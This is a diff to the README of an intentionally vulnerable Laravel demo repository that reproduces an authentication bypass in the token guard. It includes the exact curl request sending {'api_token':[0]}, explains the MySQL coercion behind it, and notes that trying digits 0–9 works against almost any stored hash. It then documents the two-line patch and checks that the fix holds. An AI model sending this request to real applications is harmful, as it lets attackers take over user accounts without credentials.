@@ -25,31 +25,15 @@ docker compose exec -u sail laravel.test php artisan migrate --seed
 
 This seeds a demo user (`demo@example.com` / `password`) alongside 9 random users. The app is now at `http://localhost:8000` (change `APP_PORT` in `.env` if 8000 is taken).
 
-No login, no token, no credentials — send an array-valued `api_token` straight at a protected route:
+### The bypass, in one request
+
+No patch is registered by default, and `guards.api.hash` is omitted by default in `config/auth.php` — older `TokenGuard` treats a missing `hash` as `false`, the vulnerable configuration this issue is about. The seeder also gives the demo user a fixed `api_token` (`sha256('fixed-demo-seed')`) chosen so MySQL's string-to-number coercion reads it as `0`. So straight after seeding, with no login, no token, and no password:
 
 ```bash
-curl -sS -G http://localhost:8000/api/user -H 'Accept: application/json' \
-  --data-urlencode 'api_token[]=x'
+curl -i -X GET http://localhost:8000/api/user --json '{"api_token":[0]}'
 ```
 
-No patch is registered by default, so `TokenGuard::user()` runs unmodified and the array is passed straight through to `hash()` and `EloquentUserProvider`. With the default `hash => true`, this produces HTTP 500 (see below) rather than being rejected earlier in the stack — one unauthenticated request is enough to confirm the array input reaches the guard.
-
-Now log in and fetch a token, needed for the normal-authentication check and to seed a stored `api_token` for the bypass test below:
-
-```bash
-curl -s -X POST http://localhost:8000/api/login \
-  -H 'Content-Type: application/json' -H 'Accept: application/json' \
-  -d '{"email":"demo@example.com","password":"password"}'
-```
-
-Check normal authentication using the `access_token` returned by login (with the default `hash => true`):
-
-```bash
-curl -i http://localhost:8000/api/user -H 'Accept: application/json' \
-  -H 'Authorization: Bearer <access_token>'
-```
-
-Then submit a JSON array containing a number. The query string `api_token[]=0` produces an array of strings, so it does not reproduce this numeric comparison.
+This returns **HTTP 200** with the demo user's full profile. `--json` (curl 7.82+) sets `Content-Type`/`Accept` to `application/json` and sends the body, but it also implies `-X POST`, so `-X GET` must come after it to keep the route's method (otherwise you get HTTP 405). On older curl, spell it out:
 
 ```bash
 curl -i -X GET http://localhost:8000/api/user \
@@ -57,11 +41,30 @@ curl -i -X GET http://localhost:8000/api/user \
   -d '{"api_token":[0]}'
 ```
 
-With the unpatched guard, HTTP 500 has been observed with `hash => true`. Change `guards.api.hash` in `config/auth.php` to `false`, run `php artisan config:clear` inside the container, and repeat the request: authentication can be bypassed if a stored token matches the numeric comparison. The result depends on the stored values. All initially seeded `api_token` values are `null`, so log in first to store a token. Changing `hash` alone does not require rerunning Composer.
+Why this works: `TokenGuard::user()` has no `is_string()` check, so the array `[0]` passes `! empty($token)` and reaches `EloquentUserProvider::retrieveByCredentials()`, which turns an array value into `whereIn('api_token', [0])`. MySQL/MariaDB then compares the stored string to the integer `0` by reading the string's *leading run of digits* (none here, since the hash starts with a letter) — so it matches. A request using a query string instead of a JSON body (`curl -G --data-urlencode 'api_token[]=0'`) does **not** reproduce this: query-string values are always PHP strings, which compare as exact strings, never coerced to numbers.
+
+In a real app the attacker doesn't control the seed, but the coercion only depends on the stored hash's leading character, so `0`–`9` covers almost every case; see [`docs/analysis.md`](docs/analysis.md) for the full mechanism.
+
+### Confirm normal authentication still works
+
+Logging in overwrites the fixed demo token with a new random one, so do this after the bypass check above, not before:
+
+```bash
+curl -s -X POST http://localhost:8000/api/login \
+  -H 'Content-Type: application/json' -H 'Accept: application/json' \
+  -d '{"email":"demo@example.com","password":"password"}'
+
+curl -i http://localhost:8000/api/user -H 'Accept: application/json' \
+  -H 'Authorization: Bearer <access_token>'
+```
+
+### `hash => true`: a crash, not a fix
+
+Uncomment `'hash' => true,` in `config/auth.php`, run `php artisan config:clear` inside the container, and repeat the bypass request: instead of HTTP 200 you get **HTTP 500**, because `hash('sha256', $token)` rejects the array before the comparison happens. That's an incidental crash, not a rejection — see [the configuration check below](#1-are-you-affected-about-1-minute) for why `hash => true` is not a fix either. Comment it back out (and `config:clear`) to return to this repository's default, vulnerable state (`hash` omitted, treated as `false`).
 
 ### ✅ Apply the fix and confirm it works
 
-So far, everything above ran **unpatched**: HTTP 500 with `hash => true`, and an authentication bypass (HTTP 200) with `hash => false`. Now apply `patches/tokenguard-is-string-fix.patch` — the exact two-line backport from [Fix](#2-fix) below — and confirm the same attack no longer works.
+So far, everything above ran **unpatched**. Now apply `patches/tokenguard-is-string-fix.patch` — the exact two-line backport from [Fix](#2-fix) below — and confirm the same attack no longer works.
 
 Register `patches/tokenguard-is-string-fix.patch` under `extra.patches.laravel/framework` in `composer.json`, then reinstall the framework and clear the configuration cache:
 
@@ -70,12 +73,14 @@ docker compose exec -u sail laravel.test composer reinstall laravel/framework --
 docker compose exec -u sail laravel.test php artisan config:clear
 ```
 
+If `composer reinstall` reports "Package is not installed", run `composer install --prefer-dist --no-interaction` once first, then retry the `reinstall`. The same two commands, run again after removing the `extra.patches` entry, put the app back in its default **unpatched** state.
+
 | | Before the fix | After the fix |
 |-|-|-|
+| Array sent with `hash` omitted (this repo's default, treated as `false`) | HTTP 200 (auth bypass) | **HTTP 401** (never reaches the database) |
 | Array sent with `hash => true` | HTTP 500 (exception) | **HTTP 401** (rejected by the type check) |
-| Array sent with `hash => false` | HTTP 200 (auth bypass) | **HTTP 401** (never reaches the database) |
 
-Resend the same `{"api_token":[0]}` request under both `hash => true` and `hash => false`: both should now return HTTP 401, and the request should never reach `EloquentUserProvider`'s query. The login handler stores hashed tokens, so restore `hash => true` and clear the configuration cache when checking normal token authentication.
+Resend the same `{"api_token":[0]}` request under both `hash => true` and `hash => false`: both should now return HTTP 401, and the request should never reach `EloquentUserProvider`'s query.
 
 Tear down with `docker compose down -v` (the `-v` also removes the MySQL data volume).
 
@@ -157,7 +162,7 @@ A Laravel 8.5 application (the last skeleton that scaffolds the `token` guard) k
 > [!WARNING]
 > **Local security research and education only. Never deploy this or expose it to the internet.** Its authentication setup is intentionally insecure. Use disposable data and systems you own or are authorized to test.
 >
-> **No patch is registered by default.** The app runs the unpatched `TokenGuard::user()` as-is, so the vulnerable behavior described below is live out of the box. Registering the real fix patch is covered in the [analysis](docs/analysis.md#how-this-repository-manages-patches).
+> **No patch is registered by default, and `guards.api.hash` is omitted by default** (treated as `false`). The app runs the unpatched `TokenGuard::user()` as-is, and the demo user's seeded token is chosen to make the bypass reproduce deterministically, so the vulnerable behavior described below is live out of the box. Registering the real fix patch is covered in the [analysis](docs/analysis.md#how-this-repository-manages-patches).
 
 ## Learn more
 
